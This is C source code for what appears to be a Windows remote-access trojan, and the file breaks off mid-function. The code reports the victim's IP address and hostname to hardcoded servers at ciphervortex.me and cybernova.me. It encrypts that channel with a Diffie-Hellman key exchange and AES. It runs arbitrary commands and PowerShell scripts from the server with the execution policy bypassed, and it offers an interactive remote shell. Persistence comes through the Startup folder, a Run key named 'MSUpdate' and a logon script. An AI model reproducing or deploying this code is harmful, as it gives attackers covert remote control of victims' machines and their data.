#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlobj.h>
#include <openssl/bn.h>
#include <openssl/dh.h>
#include <openssl/sha.h>
#include <ctype.h>
#include <curl/curl.h>
#include <jansson.h>
#include <time.h>
#include <unistd.h>

#include "anti-debug.h"
#include "sandbox.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "libcurl.lib")

#define BUFFER_SIZE 4096
#define AES_KEY_SIZE 16
#define AES_BLOCK_SIZE 16
#define COMMAND_DELIMITER ";;;"
#define SIZE_HEADER_LENGTH 8

BYTE hardcoded_key[AES_KEY_SIZE] = "xxxxxxxxxxxxxxxx";
int BEACON = 0;
char* DIRNAME = "";
char STORE_PATH[MAX_PATH];
char BIN_PATH[MAX_PATH];

void create_socket(SOCKET *client_socket);
void connect_to_server(SOCKET client_socket);
void debug_send(SOCKET sock, const char *buffer, int buffer_length, int flags);
void resolve_doh(const char *domain, char *resolved_ip) ;
void receive_commands(SOCKET client_socket, HANDLE hStdoutRead, HANDLE hStdinWrite);
void execute_script(SOCKET client_socket,const char *script);
void perform_diffie_hellman(SOCKET client_socket);
int encrypt_data(const BYTE *plaintext, DWORD plaintext_size, BYTE *ciphertext, DWORD *ciphertext_size);
int decrypt_data(const BYTE *ciphertext, DWORD ciphertext_size, BYTE *plaintext, DWORD *plaintext_size);
void pkcs7_pad(const BYTE *plaintext, DWORD plaintext_size, BYTE **padded_plaintext, DWORD *padded_size);
void pkcs7_unpad(BYTE *padded_plaintext, DWORD *unpadded_size);
char* base64_encode(const BYTE *data, DWORD data_length);
BYTE* base64_decode(const char *b64_string, DWORD *output_length);

void create_socket(SOCKET *client_socket) {
    *client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (*client_socket == INVALID_SOCKET) {
        fprintf(stderr, "Socket creation failed. Error Code : %d\n", WSAGetLastError());
        WSACleanup();
        exit(EXIT_FAILURE);
    }
}

int is_whitespace_only(const char *str) {
    if (str == NULL) return 0;
    while (*str) {
        if (!isspace((unsigned char)*str)) {
            return 0;
        }
        str++;
    }
    return 1;
}

struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (ptr == NULL) {
        printf("Not enough memory (realloc failed)\n");
        return 0;
    }
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

void resolve_doh(const char *domain, char *resolved_ip) {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;
    const char *doh_urls[] = {
        "https://dns.nextdns.io/dns-query",
        "https://cloudflare-dns.com/dns-query",
        "https://dns.google/resolve"
    };
    char full_url[512];
    json_error_t error;
    json_t *root;
    int i;
    for (i = 0; i < 3; i++) {
        snprintf(full_url, sizeof(full_url), "%s?name=%s", doh_urls[i], domain);
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, full_url);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, (struct curl_slist *)curl_slist_append(NULL, "Accept: application/dns-json"));
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L); // 10 seconds timeout
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                // printf("Trying DoH resolver : %s\n", doh_urls[i]);
                // printf("Raw DoH Response :\n%s\n", chunk.memory);
                root = json_loads(chunk.memory, 0, &error);
                if (root) {
                    json_t *answer = json_object_get(root, "Answer");
                    if (json_is_array(answer)) {
                        json_t *first_answer = json_array_get(answer, 0);
                        if (json_is_object(first_answer)) {
                            json_t *data = json_object_get(first_answer, "data");
                            if (json_is_string(data)) {
                                strncpy(resolved_ip, json_string_value(data), 100);
                                resolved_ip[99] = '\0';
                                // printf("Resolved IP: %s\n", resolved_ip);
                                json_decref(root);
                                curl_easy_cleanup(curl);
                                free(chunk.memory);
                                curl_global_cleanup();
                                return;
                            }
                        }
                    }
                    json_decref(root);
                } else {
                    fprintf(stderr, "Error parsing JSON : %s\n", error.text);
                }
            } else {
                printf("Failed to Query Resolver : %s\n", doh_urls[i]);
            }
            curl_easy_cleanup(curl);
        }
        if (chunk.memory) {
            free(chunk.memory);
            chunk.memory = malloc(1);
            chunk.size = 0;
        }
    }
    fprintf(stderr, "Failed to resolve the domain with all DoH resolvers.\n");
    curl_global_cleanup();
}

void debug_send(SOCKET sock, const char *buffer, int buffer_length, int flags) {
    // printf("Preparing to send data: %.*s\n", buffer_length, buffer);
    // const char *url = "http://127.0.0.1:8081/dataforge";
    const char *url = "https://ciphervortex.me:8081/dataforge";
    // const char *url = "https://cybernova.me:8081/dataforge";
    // printf("Raw data being sent to server: %.*s\n", buffer_length, buffer);
    CURL *curl;
    CURLcode res;
    struct curl_slist *headers = NULL;
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
        headers = curl_slist_append(headers, "Content-Type: text/plain");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buffer);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, buffer_length);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L); // 10 seconds timeout
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            // printf("Curl request failed: %s\n", curl_easy_strerror(res));
        } else {
            printf("Data sent successfully to %s\n", url);
        }
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    } else {
        printf("Failed to initialize CURL.\n");
    }
    curl_global_cleanup();
}

const char* fetch_data() {
    static char buffer[BUFFER_SIZE]; // Static buffer to hold the result
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);  // Initial allocation
    chunk.size = 0;           // Initial size
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize CURL\n");
        return NULL;
    }
    // curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8081/querynest");
    curl_easy_setopt(curl, CURLOPT_URL, "https://ciphervortex.me:8081/querynest");
    // curl_easy_setopt(curl, CURLOPT_URL, "https://cybernova.me:8081/querynest");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L); // 10 seconds timeout
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "CURL request failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        free(chunk.memory);
        return NULL;
    }
    json_error_t error;
    json_t *root = json_loads(chunk.memory, 0, &error);
    if (!root) {
        fprintf(stderr, "JSON parsing error: %s\n", error.text);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        free(chunk.memory);
        return NULL;
    }
    json_t *stored_data = json_object_get(root, "stored_data");
    if (!json_is_string(stored_data)) {
        // fprintf(stderr, "\"stored_data\" key not found or not a string\n");
        json_decref(root);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        free(chunk.memory);
        return "";
    }
    const char *result = json_string_value(stored_data);
    if (strlen(result) >= BUFFER_SIZE) {
        // fprintf(stderr, "Buffer size too small for the result\n");
        json_decref(root);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        free(chunk.memory);
        return "";
    }
    strncpy(buffer, result, BUFFER_SIZE - 1);
    buffer[BUFFER_SIZE - 1] = '\0';  // Ensure null termination
    json_decref(root);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    free(chunk.memory);
    return buffer;  // Return the static buffer
}

void connect_to_server(SOCKET client_socket) {
    struct sockaddr_in server_addr;
    char resolved_ip[100] = {0};
    // printf("Resolving server IP using DoH...\n");
    // resolve_doh("ciphervortex.me", resolved_ip);
    // resolve_doh("cybernova.me", resolved_ip);
    // if (strlen(resolved_ip) == 0) {
    //     printf("Failed to resolve server IP.\n");
    //     exit(1);
    // }
    // printf("Resolved server IP : %s\n", resolved_ip);
    // strcpy(resolved_ip, "127.0.0.1");
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8082);
    server_addr.sin_addr.s_addr = inet_addr(resolved_ip);
    // if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
    //     fprintf(stderr, "Connection to server failed. Error Code : %d\n", WSAGetLastError());
    //     closesocket(client_socket);
    //     WSACleanup();
    //     exit(EXIT_FAILURE);
    // }
    // printf("Connected to server at port 8082.\n");
    perform_diffie_hellman(client_socket);
    char client_ip[16];
    int client_port;
    getsockname(client_socket, (struct sockaddr *)&server_addr, &(int){sizeof(server_addr)});
    strcpy(client_ip, inet_ntoa(server_addr.sin_addr));
    client_port = ntohs(server_addr.sin_port);
    char hostname[MAX_PATH];
    GetComputerNameA(hostname, &(DWORD){sizeof(hostname)});
    char flags[BUFFER_SIZE];
    snprintf(flags, sizeof(flags), "IP_ADDRESS**%s**PORT_NUMBER**%d**HOSTNAME**%s", client_ip, client_port, hostname);
    BYTE encrypted_flags[BUFFER_SIZE];
    DWORD encrypted_size = sizeof(encrypted_flags);
    encrypt_data((BYTE *)flags, strlen(flags), encrypted_flags, &encrypted_size);
    char *b64_encrypted_flags = base64_encode(encrypted_flags, encrypted_size);
    debug_send(client_socket, b64_encrypted_flags, strlen(b64_encrypted_flags), 0);
    free(b64_encrypted_flags);
}

void execute_script(SOCKET client_socket, const char *script) {
    char temp_script_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_script_path);
    strcat(temp_script_path, "temp_script.ps1");
    FILE *file = fopen(temp_script_path, "w");
    if (file == NULL) {
        perror("Failed to create temporary script file");
        return;
    }
    fputs(script, file);
    fclose(file);
    char command[MAX_PATH + 50];
    sprintf(command, "powershell.exe -ExecutionPolicy Bypass -File %s > output.txt", temp_script_path);
    system(command);
    remove(temp_script_path);
    FILE *fp = fopen("output.txt", "r");
    if (fp) {
        char buffer[BUFFER_SIZE] = {0};
        char command_buffer[BUFFER_SIZE] = {0};        
        while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
            strncat(command_buffer, buffer, sizeof(command_buffer) - strlen(command_buffer) - 1);
        }
        fclose(fp);
        if (strlen(command_buffer) == 0) {
            const char *no_output_message = "The script has been executed, and there is no output";
            BYTE encrypted_result[BUFFER_SIZE];
            DWORD encrypted_size = sizeof(encrypted_result);
            encrypt_data((BYTE *)no_output_message, strlen(no_output_message), encrypted_result, &encrypted_size);
            char *b64_encrypted_result = base64_encode(encrypted_result, encrypted_size);
            debug_send(client_socket, b64_encrypted_result, strlen(b64_encrypted_result), 0);
            free(b64_encrypted_result);
        } else {
            BYTE encrypted_result[BUFFER_SIZE];
            DWORD encrypted_size = sizeof(encrypted_result);
            encrypt_data((BYTE *)command_buffer, strlen(command_buffer), encrypted_result, &encrypted_size);
            char *b64_encrypted_result = base64_encode(encrypted_result, encrypted_size);
            debug_send(client_socket, b64_encrypted_result, strlen(b64_encrypted_result), 0);
        }
        remove("output.txt");
    } else {
        const char *error_response = "Failed to read script output.";
        debug_send(client_socket, error_response, strlen(error_response), 0);
    }
}

void perform_diffie_hellman(SOCKET client_socket) {
    const char *prime_hex = "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
                            "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
                            "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
                            "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
                            "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
                            "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
                            "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
                            "670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
                            "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
                            "DE2BCBF6955817183995497CEA956AE515D2261898FA0510"
                            "15728E5A8AACAA68FFFFFFFFFFFFFFFF";
    BIGNUM *p = BN_new();
    BIGNUM *g = BN_new();
    BN_hex2bn(&p, prime_hex);
    BN_set_word(g, 2);
    DH *dh = DH_new();
    DH_set0_pqg(dh, p, NULL, g);
    if (DH_generate_key(dh) != 1) {
        fprintf(stderr, "Failed to generate keys.\n");
        DH_free(dh);
        return;
    }
    const BIGNUM *priv_key = DH_get0_priv_key(dh);
    char *hex_priv_key = BN_bn2hex(priv_key);
    // printf("Client Private Key : %s\n\n", hex_priv_key);
    const BIGNUM *pub_key = DH_get0_pub_key(dh);
    char *hex_pub_key = BN_bn2hex(pub_key);
    // printf("Client Public Key : %s\n\n", hex_pub_key);
    debug_send(client_socket, hex_pub_key, strlen(hex_pub_key), 0);
    OPENSSL_free(hex_pub_key);
    const char *server_pub_key_hex = fetch_data();
    // printf("Server Public Key: %s\n", server_pub_key_hex);
    BIGNUM *server_pub_key = NULL;
    BN_hex2bn(&server_pub_key, server_pub_key_hex);
    size_t shared_key_len = DH_size(dh);
    unsigned char *shared_key = calloc(shared_key_len, sizeof(unsigned char));
    if (shared_key == NULL) {
        fprintf(stderr, "Failed to allocate memory for shared key.\n");
        BN_free(server_pub_key);
        DH_free(dh);
        return;
    }
    int computed_key_len = DH_compute_key(shared_key, server_pub_key, dh);
    if (computed_key_len <= 0) {
        fprintf(stderr, "Failed to compute the shared key.\n");
        free(shared_key);
        BN_free(server_pub_key);
        DH_free(dh);
        return;
    }
    unsigned char hashed_key[SHA256_DIGEST_LENGTH];
    SHA256(shared_key, computed_key_len, hashed_key);
    memcpy(hardcoded_key, hashed_key, AES_KEY_SIZE);
    free(shared_key);
    BN_free(server_pub_key);
    DH_free(dh);
}

int encrypt_data(const BYTE *plaintext, DWORD plaintext_size, BYTE *ciphertext, DWORD *ciphertext_size) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BYTE *padded_plaintext = NULL;
    DWORD padded_size = 0;
    ULONG result_size = 0;
    if (BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
        return -1;
    }
    if (BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    if (BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, hardcoded_key, AES_KEY_SIZE, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    pkcs7_pad(plaintext, plaintext_size, &padded_plaintext, &padded_size);
    if (BCryptEncrypt(hKey, (PUCHAR)padded_plaintext, padded_size, NULL, NULL, 0, ciphertext, *ciphertext_size, &result_size, 0) != 0) {
        free(padded_plaintext);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    *ciphertext_size = result_size;
    free(padded_plaintext);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    return 0;
}

int decrypt_data(const BYTE *ciphertext, DWORD ciphertext_size, BYTE *plaintext, DWORD *plaintext_size) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    ULONG result_size = 0;
    if (BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) {
        return -1;
    }
    if (BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    if (BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, hardcoded_key, AES_KEY_SIZE, 0) != 0) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    if (BCryptDecrypt(hKey, (PUCHAR)ciphertext, ciphertext_size, NULL, NULL, 0, plaintext, *plaintext_size, &result_size, 0) != 0) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    *plaintext_size = result_size;
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    pkcs7_unpad(plaintext, plaintext_size);
    return 0;
}

void pkcs7_pad(const BYTE *plaintext, DWORD plaintext_size, BYTE **padded_plaintext, DWORD *padded_size) {
    DWORD padding_len = AES_BLOCK_SIZE - (plaintext_size % AES_BLOCK_SIZE);
    *padded_size = plaintext_size + padding_len;
    *padded_plaintext = (BYTE *)malloc(*padded_size);
    memcpy(*padded_plaintext, plaintext, plaintext_size);
    memset(*padded_plaintext + plaintext_size, padding_len, padding_len);
}

void pkcs7_unpad(BYTE *padded_plaintext, DWORD *unpadded_size) {
    BYTE padding_len = padded_plaintext[*unpadded_size - 1];
    *unpadded_size -= padding_len;
}

char* base64_encode(const BYTE *data, DWORD data_length) {
    DWORD b64_length = 0;
    char *b64_string = NULL;
    if (!CryptBinaryToStringA(data, data_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64_length)) {
        return NULL;
    }
    b64_string = (char *)malloc(b64_length);
    if (!CryptBinaryToStringA(data, data_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64_string, &b64_length)) {
        free(b64_string);
        return NULL;
    }
    return b64_string;
}

BYTE* base64_decode(const char *b64_string, DWORD *output_length) {
    BYTE *decoded_data = NULL;
    if (!CryptStringToBinaryA(b64_string, 0, CRYPT_STRING_BASE64, NULL, output_length, NULL, NULL)) {
        return NULL;
    }
    decoded_data = (BYTE *)malloc(*output_length);
    if (decoded_data == NULL) {
        return NULL;
    }
    if (!CryptStringToBinaryA(b64_string, 0, CRYPT_STRING_BASE64, decoded_data, output_length, NULL, NULL)) {
        free(decoded_data);
        return NULL;
    }
    return decoded_data;
}

void receive_commands(SOCKET client_socket, HANDLE hStdoutRead, HANDLE hStdinWrite) {
    char buffer[BUFFER_SIZE];
    int bytes_received;
    while (1) {
        // Sleep(5000);
        memset(buffer, 0, BUFFER_SIZE);
        const char *buffery = fetch_data();
        strncpy(buffer, buffery, BUFFER_SIZE);
        buffer[BUFFER_SIZE] = '\0';
        // printf("Data received: %s\n%d", buffer,strlen(buffer));
        if (strlen(buffer) == 0){
            continue;
        }
        DWORD decoded_size = 0;
        BYTE *decoded_data = base64_decode(buffer, &decoded_size);
        if (decoded_data == NULL) {
            // printf("Failed to decode Base64 data.\n");
            continue;
        }
        BYTE decrypted_buffer[BUFFER_SIZE];
        DWORD decrypted_size = BUFFER_SIZE;
        decrypt_data(decoded_data, decoded_size, decrypted_buffer, &decrypted_size);
        decrypted_buffer[decrypted_size] = '\0';
        free(decoded_data);
        if (strncmp((char *)decrypted_buffer, "EXIT_CLIENT", 11) == 0) {
            break;
        }
        if (!strncmp(decrypted_buffer,"BEACON",6)) {
            char* option = strtok(decrypted_buffer, " ");
            char* action = strtok(NULL, " ");
            puts(action);
            if (!strcmp(action,"on"))
            {
                puts("Beacon is on");
                BEACON = 1;
            }
            else if (!strcmp(action,"off")){
                puts("Beacon is off");
                BEACON = 0;
            }
            continue;
        }
        if (!strncmp(decrypted_buffer, "CLOSE", 5)) {
            if (BEACON == 1) {
                closesocket(client_socket);
                WSACleanup();
                Sleep(100000);
                continue;
            }
            else {
                const char *response = "Exiting client.";
                debug_send(client_socket, response, strlen(response), 0);
                break;
            }
            break;
        }
        if (strncmp(decrypted_buffer,"PERSISTENT",10) == 0) {
            char* option = strtok(decrypted_buffer, " ");
            char* action = strtok(NULL, " ");
            option = strtok(NULL, " ");
            int isElevated = 0;
            if (strcmp(option, "startup") == 0 || strcmp(option, "registry") == 0 || strcmp(option, "logon") == 0 || strcmp(option, "schtask") == 0) {
                if (strcmp(action, "add") == 0) {
                } else if (strcmp(action, "remove") == 0) {
                } else {
                    const char *error_response = "Invalid action.";
                    debug_send(client_socket, error_response, strlen(error_response), 0);
                }
            }
            else {
                const char *error_response = "Invalid option.";
                debug_send(client_socket, error_response, strlen(error_response), 0);
            }
            continue;
        }
        if (strcmp(decrypted_buffer, "SHELL") == 0) {
            DWORD bytesRead, bytesWritten;
            BYTE encrypted_result[BUFFER_SIZE];
            DWORD encrypted_size;
            size_t output_allocated_size = BUFFER_SIZE;
            char *dynamic_output_buffer = malloc(output_allocated_size);
            if (!dynamic_output_buffer) {
                fprintf(stderr, "Memory allocation failed\n");
                return;
            }
            size_t output_size = 0;
            DWORD mode = PIPE_NOWAIT;
            if (!SetNamedPipeHandleState(hStdoutRead, &mode, NULL, NULL)) {
                fprintf(stderr, "Failed to set non-blocking mode for hStdoutRead\n");
                free(dynamic_output_buffer);
                return;
            }
            while (1) {
                Sleep(1000);
                while (1) {
                    char temp_buffer[BUFFER_SIZE] = {0};
                    if (!ReadFile(hStdoutRead, temp_buffer, sizeof(temp_buffer) - 1, &bytesRead, NULL)) {
                        if (GetLastError() == ERROR_NO_DATA) {
                            break;
                        } else {
                            fprintf(stderr, "ReadFile error: %d\n", GetLastError());
                            free(dynamic_output_buffer);
                            return;
                        }
                    }
                    if (bytesRead == 0) {
                        break;
                    }
                    if (output_size + bytesRead + 1 > output_allocated_size) {
                        output_allocated_size += BUFFER_SIZE;
                        char *new_buffer = realloc(dynamic_output_buffer, output_allocated_size);
                        if (!new_buffer) {
                            fprintf(stderr, "Memory allocation failed during resize\n");
                            free(dynamic_output_buffer);
                            return;
                        }
                        dynamic_output_buffer = new_buffer;
                    }
                    memcpy(dynamic_output_buffer + output_size, temp_buffer, bytesRead);
                    output_size += bytesRead;
                    dynamic_output_buffer[output_size] = '\0';
                }
                dynamic_output_buffer[output_size] = '\0';
                encrypted_size = sizeof(encrypted_result);
                encrypt_data((BYTE *)dynamic_output_buffer, output_size, encrypted_result, &encrypted_size);
                char *b64_encrypted_result = base64_encode(encrypted_result, encrypted_size);
                size_t encoded_size = strlen(b64_encrypted_result);
                char size_header[9] = {0};
                snprintf(size_header, sizeof(size_header), "%08zu", encoded_size);
                debug_send(client_socket, size_header, 8, 0);
                size_t bytes_sent = 0;
                while (bytes_sent < encoded_size) {
                    size_t chunk_size = (encoded_size - bytes_sent > BUFFER_SIZE) ? BUFFER_SIZE : (encoded_size - bytes_sent);
                    debug_send(client_socket, b64_encrypted_result + bytes_sent, chunk_size, 0);
                    bytes_sent += chunk_size;
                }
                free(b64_encrypted_result);
                memset(dynamic_output_buffer, 0, output_allocated_size);
                output_size = 0;
                memset(buffer, 0, BUFFER_SIZE);
                const char *fetched_data = fetch_data();
                strncpy(buffer, fetched_data, BUFFER_SIZE - 1);
                buffer[bytes_received] = '\0';
                while (strlen(buffer) == 0){
                    Sleep(2000);
                    memset(buffer, 0, BUFFER_SIZE);
                    const char *fetched_data = fetch_data();
                    strncpy(buffer, fetched_data, BUFFER_SIZE - 1);
                }
                DWORD decoded_size = 0;
                BYTE *decoded_data = base64_decode(buffer, &decoded_size);
                if (!decoded_data) {
                    fprintf(stderr, "Failed to decode Base64 data\n");
                    continue;
                }
                BYTE decrypted_command[BUFFER_SIZE];
                DWORD decrypted_size = BUFFER_SIZE;
                decrypt_data(decoded_data, decoded_size, decrypted_command, &decrypted_size);
                decrypted_command[decrypted_size] = '\0';
                free(decoded_data);
                // printf("%s", decrypted_command);
                if (strncmp((char *)decrypted_command, "exit", 4) == 0) {
                    break;
                }
                if (!WriteFile(hStdinWrite, decrypted_command, strlen((char *)decrypted_command), &bytesWritten, NULL)) {
                    fprintf(stderr, "Error writing to child process.\n");
                    break;
                }
            }
            free(dynamic_output_buffer);
            continue;
        }        
        if (strcmp(decrypted_buffer, "SCRIPT_START") == 0) {
            char script[BUFFER_SIZE * 50] = {0};
            char script_e[BUFFER_SIZE * 50] = {0};
            Sleep(4000);
            const char *buffers = fetch_data();
            while (1) {
                memset(buffer, 0, BUFFER_SIZE);
                strncpy(script, buffers, BUFFER_SIZE*50);
                DWORD part_decoded_size = 0;
                BYTE *part_decoded_data = base64_decode(script, &part_decoded_size);
                if (part_decoded_data == NULL) {
                    printf("Failed to decode Base64 data.\n");
                    continue;
                }
                BYTE part_decrypted_buffer[50 * BUFFER_SIZE];
                DWORD part_decrypted_size = 50 * BUFFER_SIZE;
                if (decrypt_data(part_decoded_data, part_decoded_size, part_decrypted_buffer, &part_decrypted_size) != 0) {
                    printf("Failed to decrypt data.\n");
                    free(part_decoded_data);
                    continue;
                }
                part_decrypted_buffer[part_decrypted_size] = '\0';
                free(part_decoded_data);
                if (strstr((char *)part_decrypted_buffer, "SCRIPT_END") != NULL) {
                    strncat(script_e, (char *)part_decrypted_buffer, part_decrypted_size - strlen("SCRIPT_END"));
                    break;
                }
                strncat(script_e, (char *)part_decrypted_buffer, part_decrypted_size);
            }   
            execute_script(client_socket,script_e);
            continue;
        }
        FILE *fp = _popen(decrypted_buffer, "r");
        if (fp) {
            char buffer[BUFFER_SIZE] = {0};
            char *complete_output = NULL;
            size_t total_allocated_size = 0;
            size_t raw_total_bytes = 0;
            while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
                size_t buffer_len = strlen(buffer);
                if (raw_total_bytes + buffer_len + 1 > total_allocated_size) {
                    total_allocated_size += BUFFER_SIZE;
                    complete_output = realloc(complete_output, total_allocated_size);
                    if (!complete_output) {
                        fprintf(stderr, "Memory allocation failed.\n");
                        exit(EXIT_FAILURE);
                    }
                }
                strcpy(complete_output + raw_total_bytes, buffer);
                raw_total_bytes += buffer_len;
            }
            _pclose(fp);
            size_t encoded_total_bytes = 0;
            size_t bytes_processed = 0;
            while (bytes_processed < raw_total_bytes) {
                size_t chunk_size = (raw_total_bytes - bytes_processed > 1024) ? 1024 : (raw_total_bytes - bytes_processed);
                BYTE encrypted_chunk[BUFFER_SIZE] = {0};
                DWORD encrypted_chunk_length = sizeof(encrypted_chunk);
                encrypt_data((BYTE *)(complete_output + bytes_processed), chunk_size, encrypted_chunk, &encrypted_chunk_length);
                char *encoded_chunk = base64_encode(encrypted_chunk, encrypted_chunk_length);
                encoded_total_bytes += strlen(encoded_chunk);
                free(encoded_chunk); 
                bytes_processed += chunk_size;
            }
            char size_header[9] = {0};
            snprintf(size_header, sizeof(size_header), "%08zu", encoded_total_bytes);
            debug_send(client_socket, size_header, 8, 0);
            bytes_processed = 0;
            while (bytes_processed < raw_total_bytes) {
                size_t chunk_size = (raw_total_bytes - bytes_processed > 1024) ? 1024 : (raw_total_bytes - bytes_processed);
                BYTE encrypted_chunk[BUFFER_SIZE] = {0};
                DWORD encrypted_chunk_length = sizeof(encrypted_chunk);
                encrypt_data((BYTE *)(complete_output + bytes_processed), chunk_size, encrypted_chunk, &encrypted_chunk_length);
                char *encoded_chunk = base64_encode(encrypted_chunk, encrypted_chunk_length);
                debug_send(client_socket, encoded_chunk, strlen(encoded_chunk), 0);
                free(encoded_chunk);
                bytes_processed += chunk_size;
            }
            free(complete_output);
        } else {
            const char *error_response = "Command execution failed.";
            debug_send(client_socket, error_response, strlen(error_response), 0);
        }
    }
    closesocket(client_socket);
}

void set_persistent(char* option, int isElevated) {
    if (!strcmp(option, "startup")) {
        char binpath[MAX_PATH];
        char command[400];
        GetModuleFileNameA(NULL, binpath, MAX_PATH);
        snprintf(command, sizeof(command), "copy %s \"%%APPDATA%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", binpath);
        int res = system(command);
        if (res == 0) {
            printf("Added to startup.\n");
        } else {
            printf("Failed to add to startup.\n");
        }
    } else if (!strcmp(option, "registry")) {
        HKEY hkey;
        char binpath[MAX_PATH];
        GetModuleFileNameA(NULL, binpath, MAX_PATH);
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
            if (RegSetValueExA(hkey, "MSUpdate", 0, REG_SZ, binpath, strlen(binpath)) == ERROR_SUCCESS) {
                printf("Added to registry.\n");
            } else {
                printf("Failed to add to registry.\n");
            }
            RegCloseKey(hkey);
        } else {
            printf("Failed to open registry key.\n");
        }

    }
    else if (!strcmp(option, "logon")) {
        HKEY hkey;
        char binpath[MAX_PATH];
        snprintf(binpath, sizeof(binpath), "%s%s", STORE_PATH, "\\logon.bat");
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
            if (RegSetValueExA(hkey, "UserInitMprLogonScript", 0, REG_SZ, binpath, strlen(binpath)) == ERROR_SUCCESS) {
                printf("Added to registry.\n");
            } else {
                printf("Failed to add to registry.\n");
            }
